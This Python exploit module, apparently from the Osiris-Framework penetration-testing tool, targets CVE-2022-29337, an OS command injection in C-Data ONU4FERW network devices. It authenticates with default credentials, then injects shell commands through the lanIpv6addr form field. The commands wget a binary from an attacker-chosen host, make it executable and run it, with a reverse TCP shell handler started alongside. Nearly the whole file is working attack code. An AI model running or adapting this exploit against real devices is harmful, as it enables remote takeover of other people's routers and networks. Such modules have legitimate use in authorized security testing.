#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import requests

from core.ModuleObtainer import obtainer
from core.Processor import processor
from time import sleep
from utilities.Tools import tools
import requests
from utilities.Colors import color
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica and Luis Jacome Valencia',
    'date': '18/11/2021',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/linux/misc/cdata/onu4ferw/os_command_injection_cve_2022_29337.py',
    'license': 'GPL-2.0',
    'description': 'This version is affected by remote code execution under the formlanipv6 method which allows parameters to be passed without being sanitized to a function called va_cmd which invokes the system function.',
    'references': ['https://exploitwriter.io/2022/05/25/os-command-injection-in-c-data-onu4ferw-cve-2022-29337/','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29337']
}

options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'srvhost': ['Yes', 'Sets the HTTP server with the binary to be injected', ''],
    'srvfile': ['Yes', 'Sets the file name to inject ', ''],
    'payload': ['Yes', 'Set payload attack software', 'cmd/generic/reverse_tcp'],
    'username': ['Yes', 'Sets the username for authentication', 'adminisp'],
    'password': ['Yes', 'Sets the password for authentication', 'adminisp']
}

extra_info = {
    'cve': ['CVE-2022-29337'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def authenticate(__username, __passwd, __target):
    __data_auth = "username={}&psd={}".format(__username, __passwd)
    __path_login = "http://{}/boaform/admin/formLogin".format(__target.split("//")[1].split('/')[0])
    print_message.execution_info("[+] Authenticating with user: {0} pwd: {1}".format(color.color("yellow", __username), color.color("yellow", __passwd)))

    __headers_auth = {
        'Host': __target.split("//")[1].split('/')[0],
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '{}'.format(str(len(__data_auth)))
    }

    __response_auth = requests.request("POST", __path_login, headers=__headers_auth, data=__data_auth)
    if 'bad password' in __response_auth.text:
        return False
    else:
        return True

def exploit():
    try:
        print_message.start_execution()

        __target = tools.http_or_https(obtainer.options['target'][2])
        __url = obtainer.options['target'][2] + '/boaform/formlanipv6'
        __session = requests.Session()

        if __target['code'] == 200:

            if authenticate(obtainer.options['username'][2], obtainer.options['password'][2], obtainer.options['target'][2]):
                __platform = int(obtainer.options['platform'][2])

                if extra_info['targets'][__platform]:
                    __platform = extra_info['targets'][__platform]

                __server_host, __server_port = tools.filter_hostname(obtainer.options['srvhost'][2])['message']
                processor.multi_handler(payload_options=obtainer.options_payload,exploit_options=obtainer.options)
                __stages = ['lanIpv6addr=$(echo "" > /var/tmp/{})&submit-url=%2Fipv6.asp'.format(obtainer.options['srvfile'][2]),
                               'lanIpv6addr=$(wget {0}:{1}/{2} -O /v*/t*/s)&submit-url=%2Fipv6.asp'.format(__server_host,
                                                                                                           __server_port,
                                                                                                           obtainer.options['srvfile'][2]),
                               'lanIpv6addr=$(chmod +x /v*/t*/s;/v*/t*/{})&submit-url=%2Fipv6.asp'.format(obtainer.options['srvfile'][2])]

                for stage in __stages:
                    __headers = {
                        'Host': obtainer.options['target'][2].split("//")[1].split('/')[0],
                        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Accept-Encoding': 'gzip, deflate',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': obtainer.options['target'][2],
                        'Referer': obtainer.options['target'][2] + '/ipv6.asp',
                        'Upgrade-Insecure-Requests': '1',
                        'Content-Length': '{}'.format(str(len(stage)))
                    }

                    try:
                        print_message.execution_info(
                            "Sending  Stage: {}".format(stage.replace('\r', '').replace('\n', ' ')))
                        __response = requests.post(__url, headers=__headers, data=stage, verify=False)
                        sleep(1)
                    except Exception as Error:
                        pass

                    print_message.execution_info("Exploit sending and Triggering Sucessfully...")
            else:
                print_message.execution_error("Authentication failed...")
                return False

        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False

    except Exception as Error:
        print(Error)

    print_message.end_execution()


def check():
    pass
